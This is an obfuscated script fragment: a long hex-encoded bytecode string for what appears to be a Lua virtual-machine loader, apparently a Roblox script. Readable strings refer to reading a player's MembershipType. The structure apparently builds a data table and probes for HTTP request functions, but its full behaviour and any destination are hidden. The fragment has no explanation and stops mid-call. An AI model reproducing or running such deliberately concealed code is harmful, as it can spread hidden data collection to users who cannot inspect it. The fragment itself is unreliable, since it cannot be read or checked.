260014008A00013O0004303O008A000100200600140003003100200400140014003200121B001600374O00180014001600020006260014008A00013O0004303O008A00010020060014000300310020060014001400370020060014001400380006080014008B000100010004303O008B000100121B001400353O0012230015000F3O0020060015001500390012230016003A3O0012230017000F3O00200400170017001000121B0019002D4O001800170019000200200600170017003B00200600170017003C00200600170017003D00200400170017003E2O000700170002000200200400170017003F00121B001900404O0016001700196O00163O00020006080016009E000100010004303O009E000100121B001600353O00062C00173O000100012O001F3O00033O001223001800014O00240018000100020020060018001800042O002700193O000300300B00190041004200300B0019004300072O0027001A00014O0027001B3O000700300B001B0045004600300B001B0047004800300B001B0049004A001223001C003A3O00121B001D004C4O0007001C0002000200100A001B004B001C2O0027001C00094O0027001D3O000300300B001D004E004F00121B001E00513O001223001F00014O0024001F00010002002006001F001F000200121B002000524O00420021000B3O00121B002200534O002D001E001E002200100A001D0050001E00300B001D005400552O0027001E3O000300300B001E004E005600121B001F00573O00200600200003000D00121B002100583O00200600220003005900121B0023005A4O0042002400053O00121B0025005B4O0042002600123O00121B0027005C4O0042002800133O00121B0029005D4O0042002A00053O00121B002B005E4O002D001F001F002B00100A001E0050001F00300B001E005400552O0027001F3O000300300B001F004E005F00121B002000603O00200600210003006100121B002200624O0042002300174O002400230001000200121B002400633O001223002500233O00200600250025002400121B002600643O001223002700233O0020060027002700652O00240027000100020020060028000300610020090028002800662O00320027002700282O001800250027000200121B002600534O002D00200020002600100A001F0050002000300B001F005400552O002700203O000300300B0020004E006700121B002100684O0042002200083O00121B002300694O0042002400063O00121B0025006A4O0042002600063O00121B0027006B4O0042002800153O00121B002900534O002D00210021002900100A00200050002100300B0020005400552O002700213O000300300B0021004E006C00121B0022006D4O0042002300103O00121B0024005C4O0042002500113O00121B0026006E3O001223002700233O00200600270027002400121B0028006F4O000700270002000200121B002800534O002D00220022002800100A00210050002200300B0021005400072O002700223O000300300B0022004E007000121B002300714O0042002400163O00121B002500724O002D00230023002500100A00220050002300300B0022005400072O002700233O000300300B0023004E007300121B002400744O00420025000D3O00121B002600754O00420027000E3O00121B002800764O00420029000F3O00121B002A00773O001223002B00784O0024002B0001000200121B002C00534O002D00240024002C00100A00230050002400300B0023005400072O002700243O000300300B0024004E007900121B0025007A3O001223002600154O0042002700144O000700260002000200121B0027007B4O002D00250025002700100A00240050002500300B0024005400072O002700253O000300300B0025004E007C00121B0026007D4O00420027000A3O00121B002800534O002D00260026002800100A00250050002600300B0025005400552O002A001C0009000100100A001B004D001C2O0027001C3O000100300B001C007F008000100A001B007E001C2O0027001C3O000200121B001D00833O001223001E00233O002006001E001E002400121B001F00254O0007001E000200022O002D001D001D001E00100A001C0082001D00300B001C0084008500100A001B0081001C2O002A001A0001000100100A00190044001A001223001A00014O0024001A00010002002006001A001A0006000626001A006C2O013O0004303O006C2O0100121B001A00864O0041001B001B3O002638001A00422O0100860004303O00422O01001223001C000F3O002006001C001C0087002004001C001C0088001223001E000F3O002004001E001E008900121B0020008A3O0012230021000F3O00200400210021008900121B0023008B4O001800210023000200121B0022008C4O002D0020002000222O0016001E00206O001C3O00022O0042001B001C3O001223001C008D3O002006001C001C008E002006001D00190044002006001D001D008F002006001D001D004D2O0027001E3O000200300B001E004E009000121B001F00913O0020060020001B009200121B002100933O0020060022001B009400121B002300953O0020060024001B009600121B002500973O0020060026001B009800121B002700993O0020060028001B009A00121B0029009B3O002006002A001B009C00121B002B009D4O002D001F001F002B00100A001E0050001F2O001C001C001E00010004303O006C2O010004303O00422O01001223001A000F3O002004001A001A001000121B001C00874O0018001A001C0002002004001A001A009E2O0042001C00194O0018001A001C00022O0027001B3O000100300B001B009F00A0001223001C00A13O000608001C008E2O0100010004303O008E2O01001223001C00A23O000608001C008E2O0100010004303O008E2O01001223001C00A33O000626001C00822O013O0004303O00822O01001223001C00A33O002006001C001C00A2000608001C008E2O0100010004303O008E2O01001223001C00A43O000626001C00892O013O0004303O00892O01001223001C00A43O002006001C001C00A2000608001C008E2O0100010004303O008E2O01001223001C00A53O000626001C008E2O013O0004303O008E2O01001223001C00A53O002006001C001C00A22O0042001D001C4O0027001E3O000400100A001E00A6001800100A001E00A7001A00300B001E00A800A900100A001E00AA001B2O0001001D000200012O000F8O00113O00013O00013O00093O00028O00026O00F03F03053O007063612O6C03043O00456E756D030E3O004D656D626572736869705479706503043O004E6F6E6503053O0066616C736503043O0074727565031E3O004661696C656420746F207265747269657665204D656D626572736869703A00293O00121B3O00014O0041000100033O000E390001000700013O0004303O0007000100121B000100014O0041000200023O00121B3O00023O0026383O0002000100020004303O000200012O0041000300033O0026380001000A000100010004303O000A000100121B000400013O0026380004000D000100010004303O000D0001001223000500033O00062C00063O000100012O003F8O003D0005000200062O0042000300064O0042000200053O0006260002002200013O0004303O00220001001223000500043O0020060005000500050020060005000500060006020003001F000100050004303O001F000100121B000500073O00060800050023000100010004303O0023000100121B000500083O00060800050023000100010004303O0023000100121B000500094O0040000500023O0004303O000D00010004303O000A00010004303O002800010004303O000200012O00113O00013O00013O00013O00030E3O004D656D626572736869705479706500044O000C7O0020065O00012O00403O00024O00113O00017O00",v9(),...);
